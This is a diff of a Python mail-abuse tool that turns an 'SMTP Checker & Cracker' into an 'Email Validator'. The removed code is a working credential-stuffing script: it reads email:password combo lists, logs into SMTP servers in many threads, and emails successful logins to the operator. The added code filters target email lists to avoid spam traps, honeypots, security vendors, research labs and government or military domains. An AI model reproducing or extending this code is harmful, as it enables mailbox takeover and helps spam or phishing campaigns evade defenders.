@@ -1,22 +1,29 @@
 #!/usr/local/bin/python3
 
-import socket, threading, sys, ssl, time, re, os, random, signal, queue, base64
+import threading, sys, time, re, os, signal, queue, tempfile
 try:
-	import psutil, requests, dns.resolver
+	import psutil, requests, IP2Location, dns.resolver, dns.reversename
 except ImportError:
-	print('\033[1;33minstalling missing packages...\033[0m')
-	os.system('apt -y install python3-pip; '+sys.executable+' -m pip install psutil requests dnspython pyopenssl')
-	import psutil, requests, dns.resolver
+	print('\033[0;33minstalling missing packages...\033[0m')
+	os.system('apt -y install python3-pip; '+sys.executable+' -m pip install psutil requests dnspython IP2Location')
+	import psutil, requests, IP2Location, dns.resolver, dns.reversename
 
 if sys.version_info[0] < 3:
 	exit('\033[0;31mpython 3 is required. try to run this script with \033[1mpython3\033[0;31m instead of \033[1mpython\033[0m')
 
-# mail providers, where SMTP access is desabled by default
-bad_mail_servers = 'gmail,googlemail,google,mail.ru,yahoo,qq.com'
-# expanded lists of SMTP endpoints, where we can knock
-autoconfig_data_url = 'https://raw.githubusercontent.com/aels/mailtools/main/smtp-checker/autoconfigs_enriched.txt'
-# dangerous mx domains, skipping them all
-dangerous_domains = r'localhost|invalid|mx37\.m..p\.com|mailinator|mxcomet|mxstorm|proofpoint|perimeterwatch|securence|techtarget|cisco|spiceworks|gartner|fortinet|retarus|checkpoint|fireeye|mimecast|forcepoint|trendmicro|acronis|sophos|sonicwall|cloudflare|trellix|barracuda|security|clearswift|trustwave|broadcom|helpsystems|zyxel|mdaemon|mailchannels|cyren|opswat|duocircle|uni-muenster|proxmox|censornet|guard|indevis|n-able|plesk|spamtitan|avanan|ironscales|mimecast|trustifi|shield|barracuda|essentials|libraesva|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'
+ip2location_url = 'https://github.com/aels/mailtools/releases/download/ip2location/ip2location.bin'
+domains_whitelist_url = 'https://cdn.jsdelivr.net/gh/aels/mailtools/remove-dangerous-emails/domains_whitelist.txt'
+ip2location_path = tempfile.gettempdir()+'/ip2location.bin'
+domains_whitelist_path = tempfile.gettempdir()+'/domains_whitelist.txt'
+whitelisted_mx  = r'(google\.com|outlook\.com|googlemail\.com|qq\.com|improvmx\.com|registrar-servers\.com|emailsrvr\.com|secureserver\.net|yandex\.net|amazonaws\.com|zoho\.com|messagingengine\.com|mailgun\.org|netease\.com|yandex\.ru|ovh\.net|gandi\.net|zoho\.eu|mxhichina\.com|mail\.ru|sbnation\.com|beget\.com|securemx\.jp|hostedemail\.com|arsmtp\.com|yahoodns\.net|protonmail\.ch|pair\.com|ne\.jp|1and1\.com|ispgateway\.de|dreamhost\.com|amazon\.com|dfn\.de|aliyun\.com|163\.com|mailanyone\.net|suremail\.cn|privateemail\.com|one\.com|espmailservice\.net|nic\.in|kasserver\.com|oxcs\.net|everyone\.net|above\.com|timeweb\.ru|serverdata\.net|forwardemail\.net|bund\.de|mailhostbox\.com|kundenserver\.de|ionos\.com|expedia\.com|icoremail\.net|hostedmxserver\.com|263xmail\.com|infomaniak\.ch|hostinger\.com|automattic\.com|alibaba-inc\.com|feishu\.cn|cnhi\.com|h-email\.net|zohomail\.com|outlook\.cn|easydns\.com|cscdns\.net|zoho\.in|name\.com|migadu\.com|mailbox\.org|untd\.com|stackmail\.com|kagoya\.net|forwardmx\.io|carrierzone\.com|ucoz\.net|renr\.es|redhat\.com|hotmail\.com|hostinger\.in|fusemail\.net|disney\.com|bell\.ca)$'
+dangerous_users = r'^hr$|about|abuse|account|admin|apps|billing|calendar|catch|community|confirm|contact|contracts|customer|director|excel|fax|feedback|finance|found|hello|help|home|info|invite|job|mail|manager|marketing|newsletter|office|orders|postmaster|regist|reply|report|sales|scanner|security|service|staff|submission|support|survey|tech|test|twitter|verification|webmaster'
+dangerous_zones = r'(\.us|\.gov|\.mil|\.edu)$'
+dangerous_isps  = r'acronis|avanan|barracuda|barracuda|broadcom|censornet|checkpoint|cisco|clearswift|cloudflare|cyren|duocircle|essentials|fireeye|forcepoint|fortinet|gartner|guard|helpsystems|indevis|invalid|ironscales|jellyfish|libraesva|localhost|mailchannels|mailinator|mdaemon|mimecast|mimecast|mx37\.m..p\.com|mxcomet|mxstorm|n-able|opswat|perimeterwatch|plesk|proofpoint|proxmox|retarus|securence|security|shield|sonicwall|sophos|spamtitan|spiceworks|techtarget|trellix|trendmicro|trustifi|trustwave|uni-muenster|zyxel'
+dangerous_isps2 = r'abus|bad|black|bot|brukalai|excello|filter|honey|junk|lab|list|metunet|rbl|research|security|spam|trap|ubl|virtual|virus|vm\d'
+dangerous_title = r'<title>[^<]*(security|spam|filter|antivirus)[^<]*<'
+
+resolver_obj = dns.resolver.Resolver()
+requests.packages.urllib3.disable_warnings()
 
 b   = '\033[1m'
 z   = '\033[0m'
@@ -39,7 +46,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v23.02.19{z}
+          ╙     {b}Validol - Email Validator v23.02.19{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/freebug
@@ -75,42 +82,48 @@ def bold(s):
 def num(s):
 	return f'{int(s):,}'
 
+def debug(msg):
+	global debugging, results_que
+	if debugging:
+		results_que.put((True, msg, ''))
+
 def tune_network():
 	if os.name != 'nt':
 		try:
 			import resource
-			resource.setrlimit(8, (2**20, 2**20))
-			print(okk+'tuning rlimit_nofile:          '+', '.join([bold(num(i)) for i in resource.getrlimit(8)]))
-			# if os.geteuid() == 0:
-			# 	print('tuning network settings...')
-			# 	os.system("echo 'net.core.rmem_default=65536\nnet.core.wmem_default=65536\nnet.core.rmem_max=8388608\nnet.core.wmem_max=8388608\nnet.ipv4.tcp_max_orphans=4096\nnet.ipv4.tcp_slow_start_after_idle=0\nnet.ipv4.tcp_synack_retries=3\nnet.ipv4.tcp_syn_retries =3\nnet.ipv4.tcp_window_scaling=1\nnet.ipv4.tcp_timestamp=1\nnet.ipv4.tcp_sack=0\nnet.ipv4.tcp_reordering=3\nnet.ipv4.tcp_fastopen=1\ntcp_max_syn_backlog=1500\ntcp_keepalive_probes=5\ntcp_keepalive_time=500\nnet.ipv4.tcp_tw_reuse=1\nnet.ipv4.tcp_tw_recycle=1\nnet.ipv4.ip_local_port_range=32768 65535\ntcp_fin_timeout=60' >> /etc/sysctl.conf")
-			# else:
-			# 	print('Better to run this script as root to allow better network performance')
+			resource.setrlimit(8, (2**14, 2**14))
+			print(okk+'tuning rlimit_nofile:          '+', '.join([num(i) for i in resource.getrlimit(8)]))
 		except Exception as e:
-			print(wrn+'failed to set rlimit_nofile:   '+str(e))
+			print(wrn+'failed to set rlimit_nofile:   '+orange(e))
 
-def check_ipv6():
-	try:
-		socket.has_ipv6 = requests.get('https://api6.ipify.org', timeout=3).text
-	except:
-		socket.has_ipv6 = False
+def check_database_exists():
+	global ip2location_url, ip2location_path
+	if not os.path.isfile(ip2location_path):
+		print(inf+f'downloading {b}ip2location.bin{z} file. it will take some time...'+up)
+		try:
+			ip2location_body = requests.get(ip2location_url, timeout=5).content
+			open(ip2location_path, 'wb').write(ip2location_body)
+		except Exception as e:
+			exit(wl+err+'cannot download ip2location.bin: '+red(e))
+	print(wl+okk+'ip2location.bin path:          '+ip2location_path)
 
-def debug(msg):
-	global debuglevel, results_que
-	debuglevel and results_que.put(msg)
+def check_whitelist_exists():
+	global domains_whitelist_url, domains_whitelist_path
+	if not os.path.isfile(domains_whitelist_path):
+		print(inf+f'downloading {b}domains whitelist{z} file. it will take some time...'+up)
+		try:
+			domains_whitelist_body = requests.get(domains_whitelist_url, timeout=5).text
+			open(domains_whitelist_path, 'w').write(domains_whitelist_body)
+		except Exception as e:
+			exit(wl+err+'cannot download domains_whitelist.txt: '+red(e))
+	print(wl+okk+'domains_whitelist.txt path:    '+domains_whitelist_path)
 
-def load_smtp_configs():
-	global autoconfig_data_url, domain_configs_cache
-	try:
-		configs = requests.get(autoconfig_data_url, timeout=5).text.splitlines()
-		for line in configs:
-			line = line.strip().split(';')
-			if len(line) != 3:
-				continue
-			domain_configs_cache[line[0]] = (line[1].split(','), line[2])
-	except Exception as e:
-		print(err+'failed to load SMTP configs. '+str(e))
-		print(err+'performance will be affected.')
+def fill_domains_whitelist(domains_whitelist_path):
+	goods_cache = {}
+	if os.path.isfile(domains_whitelist_path):
+		for domain in open(domains_whitelist_path, 'r', encoding='utf-8', errors='ignore').read().splitlines():
+			goods_cache[domain] = 'precheck whitelist'
+	return goods_cache
 
 def first(a):
 	return (a or [''])[0]
@@ -118,108 +131,102 @@ def first(a):
 def bytes_to_mbit(b):
 	return round(b/1024./1024.*8, 2)
 
-def base64_encode(string):
-	return base64.b64encode(str(string).encode('ascii')).decode('ascii')
+def sec_to_min(i):
+	return '%02d:%02d'%(int(i/60), i%60)
 
-def normalize_delimiters(s):
-	return re.sub(r'[;,\t|]', ':', re.sub(r'[\'" ]+', '', s))
-
-def is_listening(ip, port):
+def get_url_body(host):
 	try:
-		port = int(port)
-		socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
-		s = socket.socket(socket_type, socket.SOCK_STREAM)
-		s.settimeout(3)
-		s = ssl.wrap_socket(s, server_hostname=ip, do_handshake_on_connect=False) if port == 465 else s
-		s.connect((ip, port))
-		s.close()
-		return True
+		return requests.get('https://'+host, timeout=3, verify=False).text
 	except:
-		return False
+		return ''
 
-def get_rand_ip_of_host(host):
+def get_top_host(host):
+	host_arr = host.split('.')
+	return '.'.join(host_arr[-3 if len(host_arr[-2])<4 else -2:])
+
+def get_ip_of_host(host):
 	global resolver_obj
 	try:
 		host = resolver_obj.resolve(host, 'cname')[0].target
 	except:
 		pass
 	try:
-		ip_array = resolver_obj.resolve(host, socket.has_ipv6 and 'aaaa' or 'a')
-	except:
-		try:
-			ip_array = resolver_obj.resolve(host, 'a')
-		except:
-			raise Exception('No A record found for '+host)
-	ip = str(random.choice(ip_array))
-	debug('get ip: '+ip)
-	return ip
+		return resolver_obj.resolve(host, 'a')[0].to_text()
+	except Exception as e:
+		return re.search(r'solution lifetime expired', str(e)) and (time.sleep(0.5) or get_ip_of_host(host))
 
-def get_alive_neighbor(ip, port):
-	if ':' in str(ip):
-		return ip
-	else:
-		tail = int(ip.split('.')[-1])
-		prev_neighbor_ip = re.sub(r'\.\d+$', '.'+str(tail - 1 if tail>0 else 2), ip)
-		next_neighbor_ip = re.sub(r'\.\d+$', '.'+str(tail + 1 if tail<255 else 253), ip)
-		if is_listening(prev_neighbor_ip, port):
-			return prev_neighbor_ip
-		if is_listening(next_neighbor_ip, port):
-			return next_neighbor_ip
-		raise Exception('No listening neighbors found for '+ip+':'+str(port))
-
-def guess_smtp_server(domain):
-	global default_login_template, resolver_obj, domain_configs_cache, dangerous_domains
-	domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
+def get_ptr(ip):
+	global resolver_obj
 	try:
-		mx_domain = str(resolver_obj.resolve(domain, 'mx')[0].exchange)[0:-1]
-		domains_arr += [mx_domain]
-	except:
-		raise Exception('no MX records found for: '+domain)
-	if is_ignored_host(mx_domain) or re.search(dangerous_domains, mx_domain) and not re.search(r'\.outlook\.com$', mx_domain):
-		raise Exception(white('skipping domain: '+mx_domain+' (for '+domain+')',2))
-	if re.search(r'protection\.outlook\.com$', mx_domain):
-		return domain_configs_cache['outlook.com']
-	for host in domains_arr:
-		try:
-			ip = get_rand_ip_of_host(host)
-		except:
-			continue
-		for port in [2525, 587, 465, 25]:
-			debug(f'trying {host}, {ip}:{port}')
-			if is_listening(ip, port):
-					return ([host+':'+str(port)], default_login_template)
-	raise Exception('no connection details found for '+domain)
+		reverse_name = dns.reversename.from_address(ip)
+		return str(resolver_obj.resolve(reverse_name, 'ptr')[0])[:-1]
+	except Exception as e:
+		return re.search(r'solution lifetime expired', str(e)) and (time.sleep(0.5) or get_ptr(ip))
 
-def get_smtp_config(domain):
-	global domain_configs_cache, default_login_template
-	domain = domain.lower()
-	if not domain in domain_configs_cache:
-		domain_configs_cache[domain] = ['', default_login_template]
-		domain_configs_cache[domain] = guess_smtp_server(domain)
-	return domain_configs_cache[domain]
+def get_mx_server(domain):
+	global resolver_obj
+	try:
+		return str(resolver_obj.resolve(domain, 'mx')[0].exchange)[:-1]
+	except Exception as e:
+		return re.search(r'solution lifetime expired', str(e)) and (time.sleep(0.5) or get_mx_server(domain))
+
+def judge_email(email):
+	global dangerous_users, dangerous_zones, dangerous_isps, dangerous_isps2, dangerous_title, bads_cache, database, selected_email_providers
+	user, host = email.split('@')
+	if host in bads_cache:
+		raise Exception(bads_cache[host])
+	for domain in selected_email_providers.split(','):
+		if domain and domain in host:
+			return host
+	if re.search(dangerous_users, user.lower()):
+		raise Exception('bad username: '+user)
+	if re.search(dangerous_zones, host.lower()):
+		raise Exception('bad zone: '+host)
+	email_mx = get_mx_server(host)
+	if not email_mx:
+		raise Exception('no <mx> records found for: '+host)
+	if selected_email_providers:
+		for domain in selected_email_providers.split(','):
+			if domain and domain in email_mx:
+				return email_mx
+		raise Exception(email_mx)
+	if re.search(whitelisted_mx, email_mx):
+		return email_mx
+	if re.search(dangerous_isps+r'|'+dangerous_isps2, email_mx):
+		raise Exception(email_mx)
+	email_mx_ip = get_ip_of_host(email_mx)
+	if not email_mx_ip:
+		raise Exception('no <a> record found for mx server: '+email_mx)
+	email_isp = database.get_isp(email_mx_ip) or ''
+	if re.search(dangerous_isps+r'|'+dangerous_isps2, email_isp.lower()):
+		raise Exception(email_isp)
+	reversename = get_ptr(email_mx_ip) or ''
+	if re.search(dangerous_isps2, reversename):
+		raise Exception(reversename)
+	email_mx_top_host = get_top_host(email_mx)
+	if email_mx_top_host != email_mx:
+		page_body = get_url_body(email_mx_top_host)
+		if re.findall(dangerous_title, page_body.lower()):
+			raise Exception('[!] '+email_mx_top_host+': '+first(re.findall(r'<title>([^<]+)<', page_body.lower())))
+	return email_mx
+
+def is_safe_email(email):
+	global goods_cache, bads_cache
+	host = email.split('@')[-1]
+	if not host in goods_cache:
+		try:
+			goods_cache[host] = judge_email(email)
+		except Exception as e:
+			bads_cache[host] = str(e)
+			raise Exception(bads_cache[host])
+	return goods_cache[host]
+
+def extract_email(line):
+	return first(re.search(r'[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}', line))
 
 def quit(signum, frame):
 	print('\r\n'+okk+'exiting... see ya later. bye.')
 	sys.exit(0)
-
-def is_valid_email(email):
-	return re.match(r'^[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}$', email)
-
-def find_email_password_collumnes(list_filename):
-	email_collumn = False
-	with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
-		for line in fp:
-			line = normalize_delimiters(line.lower())
-			email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
-			if email:
-				email_collumn = line.split(email[0])[0].count(':')
-				password_collumn = email_collumn+1
-				if re.search(r'@[\w.-]+\.[a-z]{2,}:.+123', line):
-					password_collumn = line.count(':') - re.split(r'@[\w.-]+\.[a-z]{2,}:.+123', line)[-1].count(':')
-					break
-	if email_collumn is not False:
-		return (email_collumn, password_collumn)
-	raise Exception('the file you provided does not contain emails')
 
 def wc_count(filename, lines=0):
 	file_handle = open(filename, 'rb')
@@ -227,144 +234,26 @@ def wc_count(filename, lines=0):
 		lines += buf.count(b'\n')
 	return lines
 
-def is_ignored_host(mail):
-	global exclude_mail_hosts
-	return len([ignored_str for ignored_str in exclude_mail_hosts.split(',') if ignored_str in mail.split('@')[-1]])>0
-
-def socket_send_and_read(sock, cmd=''):
-	if cmd:
-		debug('>>> '+cmd)
-		sock.send((cmd.strip()+'\r\n').encode('ascii'))
-	scream = sock.recv(2**10).decode('ascii').strip()
-	debug('<<< '+scream)
-	return scream
-
-def socket_get_free_smtp_server(smtp_server, port):
-	port = int(port)
-	smtp_server_ip = get_rand_ip_of_host(smtp_server)
-	socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
-	s = socket.socket(socket_type, socket.SOCK_STREAM)
-	s = ssl._create_unverified_context().wrap_socket(s) if port == 465 else s
-	s.settimeout(5)
-	try:
-		s.connect((smtp_server_ip, port))
-	except Exception as e:
-		if re.search(r'too many connections|threshold limitation|parallel connections|try later|refuse', str(e).lower()):
-			smtp_server_ip = get_alive_neighbor(smtp_server_ip, port)
-			s.connect((smtp_server_ip, port))
-		else:
-			raise Exception(e)
-	return s
-
-def socket_try_tls(sock, self_host):
-	answer = socket_send_and_read(sock, 'EHLO '+self_host)
-	if re.findall(r'starttls', answer.lower()):
-		answer = socket_send_and_read(sock, 'STARTTLS')
-		if answer[:3] == '220':
-			sock = ssl._create_unverified_context().wrap_socket(sock)
-	return sock
-
-def socket_try_login(sock, self_host, smtp_login, smtp_password):
-	smtp_login_b64 = base64_encode(smtp_login)
-	smtp_pass_b64 = base64_encode(smtp_password)
-	smtp_login_pass_b64 = base64_encode(smtp_login+':'+smtp_password)
-	answer = socket_send_and_read(sock, 'EHLO '+self_host)
-	if re.findall(r'auth[\w =-]+(plain|login)', answer.lower()):
-		if re.findall(r'auth[\w =-]+login', answer.lower()):
-			answer = socket_send_and_read(sock, 'AUTH LOGIN '+smtp_login_b64)
-			if answer[:3] == '334':
-				try:
-					answer = socket_send_and_read(sock, smtp_pass_b64)
-				except:
-					raise Exception('wrong password, connection closed')
-		elif re.findall(r'auth[\w =-]+plain', answer.lower()):
-			answer = socket_send_and_read(sock, 'AUTH PLAIN '+smtp_login_pass_b64)
-		if answer[:3] == '235' and 'succ' in answer.lower():
-			return sock
-	raise Exception(answer)
-
-def socket_try_mail(sock, smtp_from, smtp_to, data):
-	answer = socket_send_and_read(sock, f'MAIL FROM: <{smtp_from}>')
-	if answer[:3] == '250':
-		answer = socket_send_and_read(sock, f'RCPT TO: <{smtp_to}>')
-		if answer[:3] == '250':
-			answer = socket_send_and_read(sock, 'DATA')
-			if answer[:3] == '354':
-				answer = socket_send_and_read(sock, data)
-				if answer[:3] == '250':
-					socket_send_and_read(sock, 'QUIT')
-					sock.close()
-					return True
-	sock.close()
-	raise Exception(answer)
-
-def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
-	global verify_email
-	if is_valid_email(smtp_user):
-		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
-	else:
-		smtp_login = smtp_user
-	s = socket_get_free_smtp_server(smtp_server, port)
-	answer = socket_send_and_read(s)
-	if answer[:3] == '220':
-		s = socket_try_tls(s, smtp_server) if port != '465' else s
-		s = socket_try_login(s, smtp_server, smtp_login, password)
-		if not verify_email:
-			s.close()
-			return True
-		headers_arr = [
-			'From: MadCat checker <%s>'%smtp_user,
-			'Resent-From: admin@localhost',
-			'To: '+verify_email,
-			'Subject: new SMTP from MadCat checker',
-			'Return-Path: '+smtp_user,
-			'Reply-To: '+smtp_user,
-			'X-Priority: 1',
-			'X-MSmail-Priority: High',
-			'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
-			'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
-			'MIME-Version: 1.0',
-			'Content-Type: text/html; charset="utf-8"',
-			'Content-Transfer-Encoding: 8bit'
-		]
-		body = f'{smtp_server}|{port}|{smtp_login}|{password}'
-		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
-		return socket_try_mail(s, smtp_user, verify_email, message_as_str)
-	s.close()
-	raise Exception(answer)
-
 def worker_item(jobs_que, results_que):
-	global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
+	global min_threads, threads_counter, no_jobs_left, loop_times, goods, bads, progress
 	while True:
-		if (mem_usage>90 or cpu_usage>90) and threads_counter>min_threads:
+		if (mem_usage>90 or cpu_usage>90) and threads_counter>min_threads or jobs_que.empty() and no_jobs_left:
 			break
 		if jobs_que.empty():
-			if no_jobs_left:
-				break
-			else:
-				results_que.put('queue exhausted, '+bold('sleeping...'))
-				time.sleep(1)
-				continue
+			time.sleep(1)
+			continue
 		else:
 			time_start = time.perf_counter()
-			smtp_server, port, smtp_user, password = jobs_que.get()
-			login_template = default_login_template
+			line = jobs_que.get()
 			try:
-				results_que.put(f'getting settings for {smtp_user}:{password}')
-				if not smtp_server or not port:
-					smtp_server_port_arr, login_template = get_smtp_config(smtp_user.split('@')[1])
-					if len(smtp_server_port_arr):
-						smtp_server, port = random.choice(smtp_server_port_arr).split(':')
-					else:
-						raise Exception('still no connection details for '+smtp_user)
-				results_que.put(blue('connecting to')+f' {smtp_server}|{port}|{smtp_user}|{password}')
-				smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
-				results_que.put(green(smtp_user+':\a'+password,7)+(verify_email and green(' sent to '+verify_email,7)))
-				open(smtp_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
+				email = extract_email(line)
+				results_que.put((True, line, is_safe_email(email)))
 				goods += 1
 			except Exception as e:
-				results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+', '.join(str(e).splitlines()).strip()))
-			time.sleep(0.04) # unlock other threads a bit
+				results_que.put((False, line, str(e)))
+				bads += 1
+			progress += 1
+			time.sleep(0.08)
 			loop_times.append(time.perf_counter() - time_start)
 			loop_times.pop(0) if len(loop_times)>min_threads else 0
 	threads_counter -= 1
@@ -377,7 +266,7 @@ def every_second():
 	while True:
 		try:
 			speed.append(progress - progress_old)
-			speed.pop(0) if len(speed)>10 else 0
+			speed.pop(0) if len(speed)>100 else 0
 			progress_old = progress
 			mem_usage = round(psutil.virtual_memory()[2])
 			cpu_usage = round(sum(psutil.cpu_percent(percpu=True))/os.cpu_count())
@@ -392,115 +281,94 @@ def every_second():
 		time.sleep(0.1)
 
 def printer(jobs_que, results_que):
-	global progress, total_lines, speed, loop_time, cpu_usage, mem_usage, net_usage, threads_counter, goods, ignored
-	while True:
-		status_bar = (
-			f'{b}['+green('\u2665',int(time.time()*2)%2)+f'{b}]{z}'+
-			f'[ progress: {bold(num(progress))}/{bold(num(total_lines))} ({bold(round(progress/total_lines*100))}%) ]'+
-			f'[ speed: {bold(num(sum(speed)))}lines/s ({bold(loop_time)}s/loop) ]'+
-			f'[ cpu: {bold(cpu_usage)}% ]'+
-			f'[ mem: {bold(mem_usage)}% ]'+
-			f'[ net: {bold(bytes_to_mbit(net_usage*10))}Mbit/s ]'+
-			f'[ threads: {bold(threads_counter)} ]'+
-			f'[ goods/ignored: {green(num(goods),1)}/{bold(num(ignored))} ]'
-		)
-		thread_statuses = []
-		while not results_que.empty():
-			thread_statuses.append(' '+results_que.get())
-			progress += 1 if 'getting' in thread_statuses[-1] else 0
-		print(wl+'\n'.join(thread_statuses+[status_bar+up]))
-		time.sleep(0.04)
+	global progress, total_lines, speed, loop_time, cpu_usage, mem_usage, net_usage, threads_counter, goods, bads
+	with open(safe_filename, 'a') as safe_file_handle, open(dangerous_filename, 'a') as dangerous_file_handle:
+		while True:
+			clock = sec_to_min(time.time()-time_start).replace(':', (' ', z+':'+b)[int(time.time()*2)%2])
+			status_bar = (
+				f'{b}['+green('\u2665',int(time.time()*2)%2)+f'{b}]{z}'+
+				f'[ {bold(clock)} \xb7 progress: {bold(num(progress))}/{bold(num(total_lines))} ({bold(round(progress/total_lines*100))}%) \xb7 speed: {bold(num(round(sum(speed)/10)))}lines/s ({bold(loop_time)}s/loop) ]'+
+				f'[ cpu: {bold(cpu_usage)}% \xb7 mem: {bold(mem_usage)}% \xb7 net: {bold(bytes_to_mbit(net_usage*10))}Mbit/s ]'+
+				f'[ threads: {bold(threads_counter)} \xb7 goods/bads: {green(num(goods),1)}/{red(num(bads),1)} ]'
+			)
+			thread_statuses = []
+			while not results_que.empty():
+				is_ok, line, msg = results_que.get()
+				if is_ok:
+					# thread_statuses.append(' '+line+': '+green(msg))
+					safe_file_handle.write(line+'\n')
+				else:
+					thread_statuses.append(' '+line+': '+red(msg))
+					dangerous_file_handle.write(line+': '+msg+'\n')
+			if len(thread_statuses):
+				print(wl+'\n'.join(thread_statuses))
+			print(wl+status_bar+up)
+			time.sleep(0.08)
 
 signal.signal(signal.SIGINT, quit)
 show_banner()
 tune_network()
-check_ipv6()
+check_database_exists()
+check_whitelist_exists()
 try:
-	help_message = f'usage: \n{npt}python3 {sys.argv[0]} '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug]'
-	list_filename = ([i for i in sys.argv if os.path.isfile(i) and sys.argv[0] != i]+[False]).pop(0)
-	verify_email = ([i for i in sys.argv if is_valid_email(i)]+[False]).pop(0)
-	exclude_mail_hosts = ','.join([i for i in sys.argv if re.match(r'[\w.,-]+$', i) and not os.path.isfile(i) and not re.match(r'(\d+|debug)$', i)]+[bad_mail_servers])
-	start_from_line = int(([i for i in sys.argv if re.match(r'\d+$', i)]+[0]).pop(0))
-	debuglevel = len([i for i in sys.argv if i == 'debug'])
-	rage_mode = len([i for i in sys.argv if i == 'rage'])
+	help_message = f'usage:\n    python3 {sys.argv[0]} '+bold('list_with_emails.txt')+' [selected,email,providers]'
+	list_filename = sys.argv[1] if len(sys.argv)>1 and os.path.isfile(sys.argv[1]) else ''
+	selected_email_providers = sys.argv[2] if len(sys.argv)>2 and sys.argv[2]!='debug' else ''
+	debugging = 'debug' in sys.argv
 	if not list_filename:
 		print(inf+help_message)
 		while not os.path.isfile(list_filename):
-			list_filename = input(npt+'path to file with emails & passwords: ')
-		while not is_valid_email(verify_email) and verify_email != '':
-			verify_email = input(npt+'email to send results to (leave empty if none): ')
-		exclude_mail_hosts = input(npt+'ignored email domains, comma separated (leave empty if none): ')
-		exclude_mail_hosts = bad_mail_servers+','+exclude_mail_hosts if exclude_mail_hosts else bad_mail_servers
-		start_from_line = input(npt+'start from line (leave empty to start from 0): ')
-		while not re.match(r'\d+$', start_from_line) and start_from_line != '':
-			start_from_line = input(npt+'start from line (leave empty to start from 0): ')
-		start_from_line = int('0'+start_from_line)
-	smtp_filename = re.sub(r'\.([^.]+)$', r'_smtp.\1', list_filename)
-	verify_email = verify_email or ''
-except Exception as e:
-	exit(err+red(e))
-try:
-	email_collumn, password_collumn = find_email_password_collumnes(list_filename)
-except Exception as e:
-	exit(err+red(e))
+			list_filename = input(npt+'path to file with emails: ')
+		selected_email_providers = input(npt+'domains to left in list, comma separated (leave empty if all): ')
+	safe_filename = re.sub(r'\.([^.]+)$', r'_safe.\1', list_filename)
+	dangerous_filename = re.sub(r'\.([^.]+)$', r'_dangerous.\1', list_filename)
+except:
+	print(err+help_message)
 
 jobs_que = queue.Queue()
 results_que = queue.Queue()
-ignored = 0
+time_start = time.time()
+bads = 0
 goods = 0
+progress = 0
+goods_cache = fill_domains_whitelist(domains_whitelist_path)
+bads_cache = {}
 mem_usage = 0
 cpu_usage = 0
 net_usage = 0
 min_threads = 50
-max_threads = debuglevel or rage_mode and 600 or 300
+max_threads = debugging and 1 or 300
 threads_counter = 0
 no_jobs_left = False
 loop_times = []
 loop_time = 0
 speed = []
-progress = start_from_line
-default_login_template = '%EMAILADDRESS%'
 total_lines = wc_count(list_filename)
-resolver_obj = dns.resolver.Resolver()
-domain_configs_cache = {}
+database = IP2Location.IP2Location(ip2location_path, 'SHARED_MEMORY')
 sys.stdout.reconfigure(encoding='utf-8')
 
-print(inf+'loading SMTP configs...'+up)
-load_smtp_configs()
-print(wl+okk+'loaded SMTP configs:           '+bold(num(len(domain_configs_cache))+' lines'))
-print(inf+'source file:                   '+bold(list_filename))
-print(inf+'total lines to procceed:       '+bold(num(total_lines)))
-print(inf+'email & password colls:        '+bold(email_collumn)+' and '+bold(password_collumn))
-print(inf+'ignored email hosts:           '+bold(exclude_mail_hosts))
-print(inf+'goods file:                    '+bold(smtp_filename))
-print(inf+'verification email:            '+bold(verify_email or '-'))
-print(inf+'ipv6 address:                  '+bold(socket.has_ipv6 or '-'))
-input(npt+'press '+bold('[ Enter ]')+' to start...')
+print(inf+'source file:                   '+list_filename)
+print(inf+'total lines to procceed:       '+num(total_lines))
+print(inf+'desired email providers:       '+(selected_email_providers or 'all'))
+print(inf+'safe emails file:              '+safe_filename)
+print(inf+'dangerous emails file:         '+dangerous_filename)
+input(npt+'press [ Enter ] to start...')
 
 threading.Thread(target=every_second, daemon=True).start()
 threading.Thread(target=printer, args=(jobs_que, results_que), daemon=True).start()
 
 with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
-	for i in range(start_from_line):
-		line = fp.readline()
 	while True:
 		while not no_jobs_left and jobs_que.qsize()<min_threads*2:
 			line = fp.readline()
 			if not line:
 				no_jobs_left = True
 				break
-			if line.count('|') == 3:
-				jobs_que.put((line.strip().split('|')))
+			if extract_email(line):
+				jobs_que.put(line.strip())
 			else:
-				line = normalize_delimiters(line.strip())
-				fields = line.split(':')
-				if len(fields)>password_collumn and is_valid_email(fields[email_collumn]) and not is_ignored_host(fields[email_collumn]) and len(fields[password_collumn])>5:
-					jobs_que.put((False, False, fields[email_collumn], fields[password_collumn]))
-				else:
-					ignored += 1
-					progress += 1
+				progress += 1
 		if threads_counter == 0 and no_jobs_left:
 			break
-		time.sleep(0.04)
-print('\r\n'+okk+green('well done. bye.',1))
-
+		time.sleep(0.08)
+	print('\r\n'+okk+green('well done. bye.'))
